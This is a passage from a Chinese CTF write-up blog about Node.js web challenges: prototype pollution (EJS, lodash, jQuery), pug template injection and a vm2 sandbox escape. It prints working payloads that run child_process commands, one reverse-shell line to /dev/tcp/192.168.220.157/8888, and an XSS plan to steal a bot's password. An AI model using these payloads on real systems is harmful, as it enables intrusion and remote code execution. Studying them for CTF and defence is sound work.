</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>,<span style="color:#a6e22e">data</span><span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;user&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">outputFunctionName</span>});
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">router</span>;
</span></span></code></pre></div><p>要触发原型链污染有个前提条件:  登录admin, 看源码的意思就是首先需要注册一个ADMIN, 但是<code>safekeyword</code>函数将这个操作限制住了, 然而<code>toUpperCase</code>有字符转化的特点, 参考</p>
<p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
<p>因此使用<code>admın </code>和随意的密码去注册一个用户, 就可以登录admin了, 登录admin之后通过action发送如下数据包</p>
<pre tabindex="0"><code>{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;);//&#34;}}
</code></pre><p>发送完之后访问一下/info就拿到了flag</p>
<p><img loading="lazy" src="/images/image-20200223184607314.png" alt="image-20200223184607314"  />
</p>
<p><a href="https://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501">https://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501</a></p>
<p>[https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md?tdsourcetag=s_pctim_aiomsg](<a href="https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split">https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split</a> second/split second.md?tdsourcetag=s_pctim_aiomsg)</p>
<h2 id="2019-xnuca-hardjs-复现">2019 XNUCA hardjs 复现<a hidden class="anchor" aria-hidden="true" href="#2019-xnuca-hardjs-复现">#</a></h2>
<p>页面功能: 注册 登录 发表评论</p>
<p>拿到源代码之后首先使用命令<code>npm audit</code>来自动检测一下是否有存在漏洞的依赖包</p>
<p><img loading="lazy" src="/images/image-20200123220813194.png" alt="image-20200123220813194"  />
</p>
<p>一个原型链污染漏洞, 好的. 看下<code>lodash</code>是干啥的</p>
<p><img loading="lazy" src="/images/image-20200123220954191.png" alt="image-20200123220954191"  />
</p>
<p>查看源代码部分看看在哪里用到了这个<code>lodash</code></p>
<p><img loading="lazy" src="/images/image-20200123221147765.png" alt="image-20200123221147765"  />
</p>
<p>大意是访问<code>/get</code>路由就会从根据userid从数据库中查询出消息, 判断条数, 如果大于5条的话, 就会对每一条都进行一个<code>lodash.defaultsDeep</code>函数处理, 查查看payload</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">mergeFn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;lodash&#39;</span>).<span style="color:#a6e22e">defaultsDeep</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;constructor&#34;: {&#34;prototype&#34;: {&#34;a0&#34;: true}}}&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mergeFn</span>({}, <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">payload</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (({})[<span style="color:#e6db74">`a0`</span>] <span style="color:#f92672">===</span> <span style="color:#66d9ef">true</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Vulnerable to Prototype Pollution via </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">payload</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">check</span>();
</span></span></code></pre></div><p>那么构造一个类似的应该就可以污染任意参数了.</p>
<p>然后思路是想通过xss让对面的bot将作为flag的password发送出来, 但是和传统的发送url链接让对面bot查看的方式不一样, 我们没有这么个玩意. 那么想要xss怎么办? 只能伪造登录进bot的账号, 再在bot的消息列表中插入xss代码, 等对面查看的时候就可以触发了, 那么怎么伪造登录呢?</p>
<p>查看一下登录验证的代码</p>
<p><img loading="lazy" src="/images/image-20200123224339539.png" alt="image-20200123224339539"  />
</p>
<p>好, 那么可以考虑一下把<code>login</code>还有<code>userid</code>这俩都给污染成true</p>
<p><img loading="lazy" src="/images/image-20200123224551590.png" alt="image-20200123224551590"  />
</p>
<p>多发几次然后路由访问<code>/get</code>去触发一下, 把cookie都删掉重新访问后就会发现成功以userid=1的身份登录了.</p>
<p>登录完之后就要考虑怎么在页面中插入xss代码了</p>
<p>在app.js中有这么一段</p>
<p><img loading="lazy" src="/images/image-20200123233543747.png" alt="image-20200123233543747"  />
</p>
<p>这个<code>$.extend</code>相当于合并数组, 这种操作也可以造成原型链污染,<code>CVE-2019-11358</code> 再来看页面渲染的部分</p>
<p><img loading="lazy" src="/images/image-20200123235223013.png" alt="image-20200123235223013"  />
</p>
<p>会把符合条件的hints标签都拿出来渲染一遍, 在这个过程中会将沙盒作用在这些标签上</p>
<p><img loading="lazy" src="/images/image-20200123235208032.png" alt="image-20200123235208032"  />
</p>
<p>也就是为什么在如图地方直接写xss代码会无效的原因</p>
<p><img loading="lazy" src="/images/image-20200123235558341.png" alt="image-20200123235558341"  />
</p>
<p>观察渲染模板<code>index.ejs</code>, 发现有一个标签<code>logger</code>不在沙盒限制中并且符合条件, 那么, 可以污染hints让他的原型中包含logger从而让hints在遍历的过程中遍历到logger然后去渲染他, logger里的内容自然是post表单了.</p>
<p><img loading="lazy" src="/images/image-20200123233034091.png" alt="image-20200123233034091"  />
</p>
<p>还有一种解法, 等我会调试js了就去补</p>
<h3 id="jade-pug-模板注入">jade pug 模板注入<a hidden class="anchor" aria-hidden="true" href="#jade-pug-模板注入">#</a></h3>
<pre tabindex="0"><code>const pug=require(&#39;pug&#39;);

pug.render(&#39;#{console.log(&#34;1&#34;)}&#39;);
pug.render(&#39;-console.log(1)&#39;);
</code></pre><p>renderfile也可以模板注入</p>
<pre tabindex="0"><code>
cmd = &#39;bash -i &gt;&amp; /dev/tcp/192.168.220.157/8888 0&gt;&amp;1&#39;

payload = &#34;process.binding(&#39;spawn_sync&#39;).spawn({file:&#39;bash&#39;,args:[&#39;/bin/bash&#39;,&#39;-c&#39;,&#39;%s&#39;],envPairs:[&#39;y=&#39;],stdio:[{type:&#39;pipe&#39;,readable:1}]})&#34; % cmd

pug = (&#39;&#39;&#39;-[][&#34;constructor&#34;][&#34;constructor&#34;](&#34;{}&#34;)()&#39;&#39;&#39;.format(payload)).replace(&#39;&#34;&#39;,&#39;%22&#39;).replace(&#34;&#39;&#34;,&#34;%27&#34;)
# pug = (&#39;&#39;&#39;#{[][&#34;constructor&#34;][&#34;constructor&#34;](&#34;%s&#34;)()}&#39;&#39;&#39;%(payload)).replace(&#39;&#34;&#39;,&#39;%22&#39;).replace(&#34;&#39;&#34;,&#34;%27&#34;)
print quote(pug)
</code></pre><p><a href="https://mp.weixin.qq.com/s/rIXIfhw3vcM9PVJI6HTq2g">https://mp.weixin.qq.com/s/rIXIfhw3vcM9PVJI6HTq2g</a></p>
<h2 id="虎符杯-2020-justescape">虎符杯 2020 JustEscape<a hidden class="anchor" aria-hidden="true" href="#虎符杯-2020-justescape">#</a></h2>
<p>由这个题目而来</p>
<p><a href="https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS">https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS</a></p>
<p>可以通过以下形式来进行计算</p>
<pre tabindex="0"><code>http://8959c4a3-f43e-45ff-a5e0-7753dd5556d6.node3.buuoj.cn/run.php?code=1-1
</code></pre><p>但是</p>
<pre tabindex="0"><code>http://8959c4a3-f43e-45ff-a5e0-7753dd5556d6.node3.buuoj.cn/run.php?code=1%2b1
</code></pre><p>会得到</p>
<p><img loading="lazy" src="/images/image-20200420112457355.png" alt="image-20200420112457355"  />
</p>
<p>从后来的表现来看, 是被过滤了.</p>
<p><img loading="lazy" src="/images/image-20200420114138186.png" alt="image-20200420114138186"  />
</p>
<p>看题目的提示,可能后端不是php, 看到插件wappalyzer显示</p>
<p><img loading="lazy" src="/images/image-20200420114321997.png" alt="image-20200420114321997"  />
</p>
<p>而且, <code>Date()</code>函数 在javascript中可以用, 不带参数. php中没有.所以可以判断后端其实是nodejs写的.</p>
<p>用<code>Error().stack</code>来获取可以使用的模块信息.</p>
<pre tabindex="0"><code>Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12)
</code></pre><p>使用payload, 从https://github.com/patriksimek/vm2/issues/225 找到的最新的.</p>
<pre tabindex="0"><code>?code[]=try{Buffer.from(new Proxy({}, {getOwnPropertyDescriptor(){throw f=&gt;f.constructor(&#34;return process&#34;)();}}));}catch(e){e(()=&gt;{}).mainModule.require(&#34;child_process&#34;).execSync(&#34;cat /flag&#34;).toString();}
</code></pre><p>原题的payload在这里打不了</p>
<pre tabindex="0"><code>var process;
try{
Object.defineProperty(Buffer.from(&#34;&#34;),&#34;&#34;,{
value:new Proxy({},{
getPrototypeOf(target){
if(this.t)
throw Buffer.from;
this.t=true;
Object.getPrototypeOf(target);
}
})
});
}catch(e){
trueprocess = e.constructor(&#34;return process&#34;)();
}
process.mainModule.require(&#34;child_process&#34;).execSync(&#34;ls&#34;).toString()
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://ch3n9w.cpolar.cn/posts/ctf-qwb-copperstudy-record/">
    <span class="title">« Prev</span>
    <br>
    <span>copperstudy-record</span>
  </a>
  <a class="next" href="https://ch3n9w.cpolar.cn/posts/ctf-roarctfwp/">
    <span class="title">Next »</span>
    <br>
    <span>RoarCTF 2019复现</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2024 <a href="https://ch3n9w.cpolar.cn/">ch3n9w の 超元域</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
